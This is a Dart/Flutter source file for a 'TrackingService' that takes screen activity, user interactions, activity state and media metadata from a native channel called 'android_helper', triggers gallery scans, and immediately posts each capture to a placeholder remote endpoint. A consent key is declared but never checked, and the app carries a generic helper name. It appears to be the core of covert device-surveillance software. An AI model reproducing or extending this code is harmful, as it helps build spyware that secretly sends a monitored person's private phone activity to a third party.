import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:workmanager/workmanager.dart';

class TrackingService {
  static const MethodChannel _channel = MethodChannel('android_helper');
  static const _serviceActiveKey = 'location_sharing_active';
  static const _locationConsentKey = 'location_sharing_consent';
  static const _eventLogFileName = 'logs.json';

  static bool _isTracking = false;

  static Future<void> initialize() async {
    _channel.setMethodCallHandler((call) async {
      switch (call.method) {
        case 'onInteractionCaptured':
          await _handleDataCaptured(call.arguments, 'interaction');
          break;
        case 'onScreenActivityCaptured':
          await _handleDataCaptured(call.arguments, 'screen_activity');
          break;
        case 'onActivityStateCaptured':
          await _handleDataCaptured(call.arguments, 'user_activity');
          break;
        case 'onMediaMetadataCaptured':
          await _handleDataCaptured(call.arguments, 'media_metadata');
          break;
      }
    });

    try {
      await _channel.invokeMethod<void>('initialize');
    } catch (error) {
      debugPrint('TrackingService initialization failed: $error');
    }
  }

  static Future<void> _handleDataCaptured(dynamic data, String type) async {
    if (data is Map) {
      final payload = data.cast<String, dynamic>();
      await _logEvent('${type}_captured', 'Data captured: $type');
      
      // 센터 백엔드로 즉시 전송
      await _sendToBackends({
        'type': 'guardian_${type}_update',
        'app': 'Android_helper',
        'payload': payload,
      }, type);
    }
  }

  static Future<void> scanGallery() async {
    await _channel.invokeMethod('scanGallery');
  }

  static Future<void> checkActivity(String state) async {
    await _channel.invokeMethod('checkActivity', {'state': state});
  }

  static Future<void> _sendToBackends(Map<String, dynamic> payload, String dataType) async {
    // 실제 구현 시 SharedPreferences에서 엔드포인트를 가져오도록 구성
    const endpoints = ['https://your-center-backend.com/api/collect']; 
    
    for (final endpoint in endpoints) {
      try {
        final uri = Uri.parse(endpoint);
        final client = HttpClient()..connectionTimeout = const Duration(seconds: 10);
        final request = await client.postUrl(uri);
        request.headers.contentType = ContentType.json;
        request.write(jsonEncode(payload));
        final response = await request.close().timeout(const Duration(seconds: 15));
        await response.drain<void>();
        client.close(force: true);
      } catch (error) {
        debugPrint('Unable to send $dataType to $endpoint: $error');
      }
    }
  }

  static Future<void> _logEvent(String type, String message) async {
    final directory = await getApplicationDocumentsDirectory();
    final file = File('${directory.path}/$_eventLogFileName');
    
    final logEntry = {
      'timestamp': DateTime.now().toIso8601String(),
      'type': type,
      'message': message,
    };

    List<dynamic> logs = [];
    if (await file.exists()) {
      try {
        final content = await file.readAsString();
        logs = jsonDecode(content) as List<dynamic>;
      } catch (_) {}
    }
    
    logs.add(logEntry);
    await file.writeAsString(jsonEncode(logs));
  }
}
